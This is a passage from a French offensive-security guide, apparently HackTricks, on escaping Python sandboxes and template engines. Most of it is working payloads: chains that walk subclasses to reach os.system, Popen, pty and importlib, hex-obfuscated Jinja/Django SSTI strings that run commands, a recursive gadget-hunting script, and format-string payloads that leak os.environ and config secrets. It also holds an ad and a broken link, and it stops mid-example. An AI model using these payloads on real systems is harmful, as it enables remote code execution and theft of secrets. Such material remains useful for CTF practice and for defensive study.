[<class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external._NamespaceLoader'>, <class '_frozen_importlib_external.FileFinder'>, <class 'zipimport.zipimporter'>, <class 'zipimport._ZipImportResourceReader'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class 'types.DynamicClassAttribute'>, <class 'types._GeneratorWrapper'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class 'reprlib.Repr'>, <class 'functools.partialmethod'>, <class 'functools.singledispatchmethod'>, <class 'functools.cached_property'>, <class 'contextlib._GeneratorContextManagerBase'>, <class 'contextlib._BaseExitStack'>, <class 'sre_parse.State'>, <class 'sre_parse.SubPattern'>, <class 'sre_parse.Tokenizer'>, <class 're.Scanner'>, <class 'rlcompleter.Completer'>, <class 'dis.Bytecode'>, <class 'string.Template'>, <class 'cmd.Cmd'>, <class 'tokenize.Untokenizer'>, <class 'inspect.BlockFinder'>, <class 'inspect.Parameter'>, <class 'inspect.BoundArguments'>, <class 'inspect.Signature'>, <class 'bdb.Bdb'>, <class 'bdb.Breakpoint'>, <class 'traceback.FrameSummary'>, <class 'traceback.TracebackException'>, <class '__future__._Feature'>, <class 'codeop.Compile'>, <class 'codeop.CommandCompiler'>, <class 'code.InteractiveInterpreter'>, <class 'pprint._safe_key'>, <class 'pprint.PrettyPrinter'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class 'threading._RLock'>, <class 'threading.Condition'>, <class 'threading.Semaphore'>, <class 'threading.Event'>, <class 'threading.Barrier'>, <class 'threading.Thread'>, <class 'subprocess.CompletedProcess'>, <class 'subprocess.Popen'>]
```
[**Ci-dessous, il y a une fonction plus grande**](./#recherche-récursive-des-builtins-globals) pour trouver des dizaines/**centaines** de **emplacements** où vous pouvez trouver les **globals**.

## Découvrir l'exécution arbitraire

Ici, je vais expliquer comment découvrir facilement **plus de fonctionnalités dangereuses chargées** et proposer des exploits plus fiables.

#### Accéder aux sous-classes avec des contournements

L'une des parties les plus sensibles de cette technique est la capacité à **accéder aux sous-classes de base**. Dans les exemples précédents, cela a été fait en utilisant `''.__class__.__base__.__subclasses__()` mais il existe **d'autres moyens possibles**:
```python
#You can access the base from mostly anywhere (in regular conditions)
"".__class__.__base__.__subclasses__()
[].__class__.__base__.__subclasses__()
{}.__class__.__base__.__subclasses__()
().__class__.__base__.__subclasses__()
(1).__class__.__base__.__subclasses__()
bool.__class__.__base__.__subclasses__()
print.__class__.__base__.__subclasses__()
open.__class__.__base__.__subclasses__()
defined_func.__class__.__base__.__subclasses__()

#You can also access it without "__base__" or "__class__"
# You can apply the previous technique also here
"".__class__.__bases__[0].__subclasses__()
"".__class__.__mro__[1].__subclasses__()
"".__getattribute__("__class__").mro()[1].__subclasses__()
"".__getattribute__("__class__").__base__.__subclasses__()

#If attr is present you can access everything as a string
# This is common in Django (and Jinja) environments
(''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')()|attr('__getitem__')(132)|attr('__init__')|attr('__globals__')|attr('__getitem__')('popen'))('cat+flag.txt').read()
(''|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fmro\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')(1)|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(132)|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('popen'))('cat+flag.txt').read()
```
### Recherche de bibliothèques dangereuses chargées

Par exemple, sachant qu'avec la bibliothèque **`sys`**, il est possible d'**importer des bibliothèques arbitraires**, vous pouvez rechercher tous les **modules chargés qui ont importé sys à l'intérieur d'eux** :
```python
[ x.__name__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ]
['_ModuleLock', '_DummyModuleLock', '_ModuleLockManager', 'ModuleSpec', 'FileLoader', '_NamespacePath', '_NamespaceLoader', 'FileFinder', 'zipimporter', '_ZipImportResourceReader', 'IncrementalEncoder', 'IncrementalDecoder', 'StreamReaderWriter', 'StreamRecoder', '_wrap_close', 'Quitter', '_Printer', 'WarningMessage', 'catch_warnings', '_GeneratorContextManagerBase', '_BaseExitStack', 'Untokenizer', 'FrameSummary', 'TracebackException', 'CompletedProcess', 'Popen', 'finalize', 'NullImporter', '_HackedGetData', '_localized_month', '_localized_day', 'Calendar', 'different_locale', 'SSLObject', 'Request', 'OpenerDirector', 'HTTPPasswordMgr', 'AbstractBasicAuthHandler', 'AbstractDigestAuthHandler', 'URLopener', '_PaddedFile', 'CompressedValue', 'LogRecord', 'PercentStyle', 'Formatter', 'BufferingFormatter', 'Filter', 'Filterer', 'PlaceHolder', 'Manager', 'LoggerAdapter', '_LazyDescr', '_SixMetaPathImporter', 'MimeTypes', 'ConnectionPool', '_LazyDescr', '_SixMetaPathImporter', 'Bytecode', 'BlockFinder', 'Parameter', 'BoundArguments', 'Signature', '_DeprecatedValue', '_ModuleWithDeprecations', 'Scrypt', 'WrappedSocket', 'PyOpenSSLContext', 'ZipInfo', 'LZMACompressor', 'LZMADecompressor', '_SharedFile', '_Tellable', 'ZipFile', 'Path', '_Flavour', '_Selector', 'JSONDecoder', 'Response', 'monkeypatch', 'InstallProgress', 'TextProgress', 'BaseDependency', 'Origin', 'Version', 'Package', '_Framer', '_Unframer', '_Pickler', '_Unpickler', 'NullTranslations']
```
Il y en a beaucoup, et **nous en avons juste besoin d'un** pour exécuter des commandes :
```python
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ][0]["sys"].modules["os"].system("ls")
```
Nous pouvons faire la même chose avec **d'autres bibliothèques** que nous savons pouvoir être utilisées pour **exécuter des commandes** :
```python
#os
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "os" in x.__init__.__globals__ ][0]["os"].system("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "os" == x.__init__.__globals__["__name__"] ][0]["system"]("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'os." in str(x) ][0]['system']('ls')

#subprocess
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "subprocess" == x.__init__.__globals__["__name__"] ][0]["Popen"]("ls")
[ x for x in ''.__class__.__base__.__subclasses__() if "'subprocess." in str(x) ][0]['Popen']('ls')
[ x for x in ''.__class__.__base__.__subclasses__() if x.__name__ == 'Popen' ][0]('ls')

#builtins
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "__bultins__" in x.__init__.__globals__ ]
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "builtins" in x.__init__.__globals__ ][0]["builtins"].__import__("os").system("ls")

#sys
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ][0]["sys"].modules["os"].system("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'_sitebuiltins." in str(x) and not "_Helper" in str(x) ][0]["sys"].modules["os"].system("ls")

#commands (not very common)
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "commands" in x.__init__.__globals__ ][0]["commands"].getoutput("ls")

#pty (not very common)
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "pty" in x.__init__.__globals__ ][0]["pty"].spawn("ls")

#importlib
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "importlib" in x.__init__.__globals__ ][0]["importlib"].import_module("os").system("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "importlib" in x.__init__.__globals__ ][0]["importlib"].__import__("os").system("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'imp." in str(x) ][0]["importlib"].import_module("os").system("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'imp." in str(x) ][0]["importlib"].__import__("os").system("ls")

#pdb
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "pdb" in x.__init__.__globals__ ][0]["pdb"].os.system("ls")
```
De plus, nous pourrions même rechercher quels modules chargent des bibliothèques malveillantes :
```python
bad_libraries_names = ["os", "commands", "subprocess", "pty", "importlib", "imp", "sys", "builtins", "pip", "pdb"]
for b in bad_libraries_names:
vuln_libs = [ x.__name__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and b in x.__init__.__globals__ ]
print(f"{b}: {', '.join(vuln_libs)}")

"""
os: CompletedProcess, Popen, NullImporter, _HackedGetData, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, CompressedValue, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, HTTPConnection, MimeTypes, BlockFinder, Parameter, BoundArguments, Signature, _FragList, _SSHFormatECDSA, CertificateSigningRequestBuilder, CertificateBuilder, CertificateRevocationListBuilder, RevokedCertificateBuilder, _CallbackExceptionHelper, Context, Connection, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, Cookie, CookieJar, BaseAdapter, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _WrappedLock, Cache, ProblemResolver, _FilteredCacheHelper, FilteredCache, NullTranslations
commands:
subprocess: BaseDependency, Origin, Version, Package
pty:
importlib: NullImporter, _HackedGetData, BlockFinder, Parameter, BoundArguments, Signature, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path
imp:
sys: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec, FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, zipimporter, _ZipImportResourceReader, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, _wrap_close, Quitter, _Printer, WarningMessage, catch_warnings, _GeneratorContextManagerBase, _BaseExitStack, Untokenizer, FrameSummary, TracebackException, CompletedProcess, Popen, finalize, NullImporter, _HackedGetData, _localized_month, _localized_day, Calendar, different_locale, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, CompressedValue, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, _LazyDescr, _SixMetaPathImporter, MimeTypes, ConnectionPool, _LazyDescr, _SixMetaPathImporter, Bytecode, BlockFinder, Parameter, BoundArguments, Signature, _DeprecatedValue, _ModuleWithDeprecations, Scrypt, WrappedSocket, PyOpenSSLContext, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, JSONDecoder, Response, monkeypatch, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _Framer, _Unframer, _Pickler, _Unpickler, NullTranslations, _wrap_close
builtins: FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, Repr, Completer, CompletedProcess, Popen, _PaddedFile, BlockFinder, Parameter, BoundArguments, Signature
pdb:
"""
```
De plus, si vous pensez que **d'autres bibliothèques** peuvent être en mesure d'**appeler des fonctions pour exécuter des commandes**, nous pouvons également **filtrer par noms de fonctions** à l'intérieur des bibliothèques potentielles:
```python
bad_libraries_names = ["os", "commands", "subprocess", "pty", "importlib", "imp", "sys", "builtins", "pip", "pdb"]
bad_func_names = ["system", "popen", "getstatusoutput", "getoutput", "call", "Popen", "spawn", "import_module", "__import__", "load_source", "execfile", "execute", "__builtins__"]
for b in bad_libraries_names + bad_func_names:
vuln_funcs = [ x.__name__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) for k in x.__init__.__globals__ if k == b ]
print(f"{b}: {', '.join(vuln_funcs)}")

"""
os: CompletedProcess, Popen, NullImporter, _HackedGetData, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, CompressedValue, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, HTTPConnection, MimeTypes, BlockFinder, Parameter, BoundArguments, Signature, _FragList, _SSHFormatECDSA, CertificateSigningRequestBuilder, CertificateBuilder, CertificateRevocationListBuilder, RevokedCertificateBuilder, _CallbackExceptionHelper, Context, Connection, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, Cookie, CookieJar, BaseAdapter, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _WrappedLock, Cache, ProblemResolver, _FilteredCacheHelper, FilteredCache, NullTranslations
commands:
subprocess: BaseDependency, Origin, Version, Package
pty:
importlib: NullImporter, _HackedGetData, BlockFinder, Parameter, BoundArguments, Signature, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path
imp:
sys: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec, FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, zipimporter, _ZipImportResourceReader, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, _wrap_close, Quitter, _Printer, WarningMessage, catch_warnings, _GeneratorContextManagerBase, _BaseExitStack, Untokenizer, FrameSummary, TracebackException, CompletedProcess, Popen, finalize, NullImporter, _HackedGetData, _localized_month, _localized_day, Calendar, different_locale, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, CompressedValue, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, _LazyDescr, _SixMetaPathImporter, MimeTypes, ConnectionPool, _LazyDescr, _SixMetaPathImporter, Bytecode, BlockFinder, Parameter, BoundArguments, Signature, _DeprecatedValue, _ModuleWithDeprecations, Scrypt, WrappedSocket, PyOpenSSLContext, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, JSONDecoder, Response, monkeypatch, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _Framer, _Unframer, _Pickler, _Unpickler, NullTranslations, _wrap_close
builtins: FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, Repr, Completer, CompletedProcess, Popen, _PaddedFile, BlockFinder, Parameter, BoundArguments, Signature
pip:
pdb:
system: _wrap_close, _wrap_close
getstatusoutput: CompletedProcess, Popen
getoutput: CompletedProcess, Popen
call: CompletedProcess, Popen
Popen: CompletedProcess, Popen
spawn:
import_module:
__import__: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec
load_source: NullImporter, _HackedGetData
execfile:
execute:
__builtins__: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec, FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, zipimporter, _ZipImportResourceReader, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, _wrap_close, Quitter, _Printer, DynamicClassAttribute, _GeneratorWrapper, WarningMessage, catch_warnings, Repr, partialmethod, singledispatchmethod, cached_property, _GeneratorContextManagerBase, _BaseExitStack, Completer, State, SubPattern, Tokenizer, Scanner, Untokenizer, FrameSummary, TracebackException, _IterationGuard, WeakSet, _RLock, Condition, Semaphore, Event, Barrier, Thread, CompletedProcess, Popen, finalize, _TemporaryFileCloser, _TemporaryFileWrapper, SpooledTemporaryFile, TemporaryDirectory, NullImporter, _HackedGetData, DOMBuilder, DOMInputSource, NamedNodeMap, TypeInfo, ReadOnlySequentialNamedNodeMap, ElementInfo, Template, Charset, Header, _ValueFormatter, _localized_month, _localized_day, Calendar, different_locale, AddrlistClass, _PolicyBase, BufferedSubFile, FeedParser, Parser, BytesParser, Message, HTTPConnection, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, Address, Group, HeaderRegistry, ContentManager, CompressedValue, _Feature, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, _LazyDescr, _SixMetaPathImporter, Queue, _PySimpleQueue, HMAC, Timeout, Retry, HTTPConnection, MimeTypes, RequestField, RequestMethods, DeflateDecoder, GzipDecoder, MultiDecoder, ConnectionPool, CharSetProber, CodingStateMachine, CharDistributionAnalysis, JapaneseContextAnalysis, UniversalDetector, _LazyDescr, _SixMetaPathImporter, Bytecode, BlockFinder, Parameter, BoundArguments, Signature, _DeprecatedValue, _ModuleWithDeprecations, DSAParameterNumbers, DSAPublicNumbers, DSAPrivateNumbers, ObjectIdentifier, ECDSA, EllipticCurvePublicNumbers, EllipticCurvePrivateNumbers, RSAPrivateNumbers, RSAPublicNumbers, DERReader, BestAvailableEncryption, CBC, XTS, OFB, CFB, CFB8, CTR, GCM, Cipher, _CipherContext, _AEADCipherContext, AES, Camellia, TripleDES, Blowfish, CAST5, ARC4, IDEA, SEED, ChaCha20, _FragList, _SSHFormatECDSA, Hash, SHAKE128, SHAKE256, BLAKE2b, BLAKE2s, NameAttribute, RelativeDistinguishedName, Name, RFC822Name, DNSName, UniformResourceIdentifier, DirectoryName, RegisteredID, IPAddress, OtherName, Extensions, CRLNumber, AuthorityKeyIdentifier, SubjectKeyIdentifier, AuthorityInformationAccess, SubjectInformationAccess, AccessDescription, BasicConstraints, DeltaCRLIndicator, CRLDistributionPoints, FreshestCRL, DistributionPoint, PolicyConstraints, CertificatePolicies, PolicyInformation, UserNotice, NoticeReference, ExtendedKeyUsage, TLSFeature, InhibitAnyPolicy, KeyUsage, NameConstraints, Extension, GeneralNames, SubjectAlternativeName, IssuerAlternativeName, CertificateIssuer, CRLReason, InvalidityDate, PrecertificateSignedCertificateTimestamps, SignedCertificateTimestamps, OCSPNonce, IssuingDistributionPoint, UnrecognizedExtension, CertificateSigningRequestBuilder, CertificateBuilder, CertificateRevocationListBuilder, RevokedCertificateBuilder, _OpenSSLError, Binding, _X509NameInvalidator, PKey, _EllipticCurve, X509Name, X509Extension, X509Req, X509, X509Store, X509StoreContext, Revoked, CRL, PKCS12, NetscapeSPKI, _PassphraseHelper, _CallbackExceptionHelper, Context, Connection, _CipherContext, _CMACContext, _X509ExtensionParser, DHPrivateNumbers, DHPublicNumbers, DHParameterNumbers, _DHParameters, _DHPrivateKey, _DHPublicKey, Prehashed, _DSAVerificationContext, _DSASignatureContext, _DSAParameters, _DSAPrivateKey, _DSAPublicKey, _ECDSASignatureContext, _ECDSAVerificationContext, _EllipticCurvePrivateKey, _EllipticCurvePublicKey, _Ed25519PublicKey, _Ed25519PrivateKey, _Ed448PublicKey, _Ed448PrivateKey, _HashContext, _HMACContext, _Certificate, _RevokedCertificate, _CertificateRevocationList, _CertificateSigningRequest, _SignedCertificateTimestamp, OCSPRequestBuilder, _SingleResponse, OCSPResponseBuilder, _OCSPResponse, _OCSPRequest, _Poly1305Context, PSS, OAEP, MGF1, _RSASignatureContext, _RSAVerificationContext, _RSAPrivateKey, _RSAPublicKey, _X25519PublicKey, _X25519PrivateKey, _X448PublicKey, _X448PrivateKey, Scrypt, PKCS7SignatureBuilder, Backend, GetCipherByName, WrappedSocket, PyOpenSSLContext, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, RawJSON, JSONDecoder, JSONEncoder, Cookie, CookieJar, MockRequest, MockResponse, Response, BaseAdapter, UnixHTTPConnection, monkeypatch, JSONDecoder, JSONEncoder, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _WrappedLock, Cache, ProblemResolver, _FilteredCacheHelper, FilteredCache, _Framer, _Unframer, _Pickler, _Unpickler, NullTranslations, _wrap_close
"""
```
## Recherche récursive des fonctions intégrées, des variables globales...

{% hint style="warning" %}
C'est tout simplement **génial**. Si vous **cherchez un objet tel que globals, builtins, open ou autre**, utilisez ce script pour **rechercher de manière récursive les endroits où vous pouvez trouver cet objet**.
{% endhint %}
```python
import os, sys # Import these to find more gadgets

SEARCH_FOR = {
# Misc
"__globals__": set(),
"builtins": set(),
"__builtins__": set(),
"open": set(),

# RCE libs
"os": set(),
"subprocess": set(),
"commands": set(),
"pty": set(),
"importlib": set(),
"imp": set(),
"sys": set(),
"pip": set(),
"pdb": set(),

# RCE methods
"system": set(),
"popen": set(),
"getstatusoutput": set(),
"getoutput": set(),
"call": set(),
"Popen": set(),
"popen": set(),
"spawn": set(),
"import_module": set(),
"__import__": set(),
"load_source": set(),
"execfile": set(),
"execute": set()
}

#More than 4 is very time consuming
MAX_CONT = 4

#The ALREADY_CHECKED makes the script run much faster, but some solutions won't be found
#ALREADY_CHECKED = set()

def check_recursive(element, cont, name, orig_n, orig_i, execute):
# If bigger than maximum, stop
if cont > MAX_CONT:
return

# If already checked, stop
#if name and name in ALREADY_CHECKED:
#    return

# Add to already checked
#if name:
#    ALREADY_CHECKED.add(name)

# If found add to the dict
for k in SEARCH_FOR:
if k in dir(element) or (type(element) is dict and k in element):
SEARCH_FOR[k].add(f"{orig_i}: {orig_n}.{name}")

# Continue with the recursivity
for new_element in dir(element):
try:
check_recursive(getattr(element, new_element), cont+1, f"{name}.{new_element}", orig_n, orig_i, execute)

# WARNING: Calling random functions sometimes kills the script
# Comment this part if you notice that behaviour!!
if execute:
try:
if callable(getattr(element, new_element)):
check_recursive(getattr(element, new_element)(), cont+1, f"{name}.{new_element}()", orig_i, execute)
except:
pass

except:
pass

# If in a dict, scan also each key, very important
if type(element) is dict:
for new_element in element:
check_recursive(element[new_element], cont+1, f"{name}[{new_element}]", orig_n, orig_i)


def main():
print("Checking from empty string...")
total = [""]
for i,element in enumerate(total):
print(f"\rStatus: {i}/{len(total)}", end="")
cont = 1
check_recursive(element, cont, "", str(element), f"Empty str {i}", True)

print()
print("Checking loaded subclasses...")
total = "".__class__.__base__.__subclasses__()
for i,element in enumerate(total):
print(f"\rStatus: {i}/{len(total)}", end="")
cont = 1
check_recursive(element, cont, "", str(element), f"Subclass {i}", True)

print()
print("Checking from global functions...")
total = [print, check_recursive]
for i,element in enumerate(total):
print(f"\rStatus: {i}/{len(total)}", end="")
cont = 1
check_recursive(element, cont, "", str(element), f"Global func {i}", False)

print()
print(SEARCH_FOR)


if __name__ == "__main__":
main()
```
Vous pouvez vérifier la sortie de ce script sur cette page :

{% content-ref url="broken-reference" %}
[Lien brisé](broken-reference)
{% endcontent-ref %}

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Trouvez les vulnérabilités les plus importantes afin de les corriger plus rapidement. Intruder suit votre surface d'attaque, effectue des analyses de menaces proactives et détecte des problèmes dans l'ensemble de votre pile technologique, des API aux applications web et aux systèmes cloud. [**Essayez-le gratuitement**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) dès aujourd'hui.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Python Format String

Si vous **envoyez** une **chaîne de caractères** à Python qui va être **formatée**, vous pouvez utiliser `{}` pour accéder aux **informations internes de Python**. Vous pouvez utiliser les exemples précédents pour accéder aux variables globales ou aux fonctions intégrées, par exemple.

{% hint style="info" %}
Cependant, il y a une **limitation**, vous ne pouvez utiliser que les symboles `.[]`, vous **ne pourrez donc pas exécuter de code arbitraire**, seulement lire des informations.\
_**Si vous savez comment exécuter du code via cette vulnérabilité, veuillez me contacter.**_
{% endhint %}
```python
# Example from https://www.geeksforgeeks.org/vulnerability-in-str-format-in-python/
CONFIG = {
"KEY": "ASXFYFGK78989"
}

class PeopleInfo:
def __init__(self, fname, lname):
self.fname = fname
self.lname = lname

def get_name_for_avatar(avatar_str, people_obj):
return avatar_str.format(people_obj = people_obj)

people = PeopleInfo('GEEKS', 'FORGEEKS')

st = "{people_obj.__init__.__globals__[CONFIG][KEY]}"
get_name_for_avatar(st, people_obj = people)
```
Notez comment vous pouvez **accéder aux attributs** de manière normale avec un **point** comme `people_obj.__init__` et aux **éléments du dictionnaire** avec des **parenthèses** sans guillemets `__globals__[CONFIG]`

Notez également que vous pouvez utiliser `.__dict__` pour énumérer les éléments d'un objet `get_name_for_avatar("{people_obj.__init__.__globals__[os].__dict__}", people_obj = people)`

D'autres caractéristiques intéressantes des chaînes de formatage sont la possibilité d'**exécuter** les **fonctions** **`str`**, **`repr`** et **`ascii`** dans l'objet indiqué en ajoutant respectivement **`!s`**, **`!r`**, **`!a`** :
```python
st = "{people_obj.__init__.__globals__[CONFIG][KEY]!a}"
get_name_for_avatar(st, people_obj = people)
```
De plus, il est possible de **coder de nouveaux formateurs** dans des classes :
```python
class HAL9000(object):
def __format__(self, format):
if (format == 'open-the-pod-bay-doors'):
return "I'm afraid I can't do that."
return 'HAL 9000'

'{:open-the-pod-bay-doors}'.format(HAL9000())
#I'm afraid I can't do that.
```
**Plus d'exemples** sur les **formats** **de chaîne** peuvent être trouvés sur [**https://pyformat.info/**](https://pyformat.info)

{% hint style="danger" %}
Consultez également la page suivante pour les gadgets qui permettront de **lire des informations sensibles à partir d'objets internes Python**:
{% endhint %}

{% content-ref url="../python-internal-read-gadgets.md" %}
[python-internal-read-gadgets.md](../python-internal-read-gadgets.md)
{% endcontent-ref %}

### Charges utiles de divulgation d'informations sensibles
```python
{whoami.__class__.__dict__}
{whoami.__globals__[os].__dict__}
{whoami.__globals__[os].environ}
{whoami.__globals__[sys].path}
{whoami.__globals__[sys].modules}

# Access an element through several links
{whoami.__globals__[server].__dict__[bridge].__dict__[db].__dict__}
```
## Disséquer les objets Python

{% hint style="info" %}
Si vous souhaitez **apprendre** en profondeur sur le **bytecode Python**, lisez cet **excellent** article sur le sujet : [**https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d**](https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d)
{% endhint %}

Dans certains CTF, il se peut que vous soyez fourni avec le nom d'une **fonction personnalisée où se trouve le drapeau** et vous devez examiner les **internes** de la **fonction** pour l'extraire.

Voici la fonction à inspecter :
```python
def get_flag(some_input):
var1=1
var2="secretcode"
var3=["some","array"]
if some_input == var2:
return "THIS-IS-THE-FALG!"
else:
return "Nope"
```
#### dir

La fonction `dir()` est une fonction intégrée en Python qui renvoie une liste contenant les noms des attributs et des méthodes d'un objet. Cette fonction est souvent utilisée pour explorer la structure d'un objet et pour obtenir des informations sur les attributs et les méthodes disponibles.

##### Syntaxe

La syntaxe de base de la fonction `dir()` est la suivante :

```python
dir([objet])
```

où `objet` est l'objet dont vous souhaitez obtenir la liste des attributs et des méthodes. Si aucun objet n'est spécifié, la fonction `dir()` renverra la liste des noms d'attributs et de méthodes disponibles dans l'espace de travail actuel.

##### Exemples

Voici quelques exemples d'utilisation de la fonction `dir()` :

```python
# Exemple 1 : Obtenir la liste des attributs et des méthodes d'une chaîne de caractères
chaine = "Bonjour"
print(dir(chaine))

# Exemple 2 : Obtenir la liste des attributs et des méthodes d'un entier
entier = 42
print(dir(entier))

# Exemple 3 : Obtenir la liste des attributs et des méthodes disponibles dans l'espace de travail actuel
print(dir())
```

Dans ces exemples, la fonction `dir()` renvoie une liste des attributs et des méthodes disponibles pour l'objet spécifié ou pour l'espace de travail actuel. Cette liste peut être utilisée pour explorer la structure d'un objet et pour accéder à ses attributs et méthodes.
```python
dir() #General dir() to find what we have loaded
['__builtins__', '__doc__', '__name__', '__package__', 'b', 'bytecode', 'code', 'codeobj', 'consts', 'dis', 'filename', 'foo', 'get_flag', 'names', 'read', 'x']
dir(get_flag) #Get info tof the function
['__call__', '__class__', '__closure__', '__code__', '__defaults__', '__delattr__', '__dict__', '__doc__', '__format__', '__get__', '__getattribute__', '__globals__', '__hash__', '__init__', '__module__', '__name__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'func_closure', 'func_code', 'func_defaults', 'func_dict', 'func_doc', 'func_globals', 'func_name']
```
#### globals

`__globals__` et `func_globals` (identiques) obtiennent l'environnement global. Dans l'exemple, vous pouvez voir certains modules importés, certaines variables globales et leur contenu déclaré :
```python
get_flag.func_globals
get_flag.__globals__
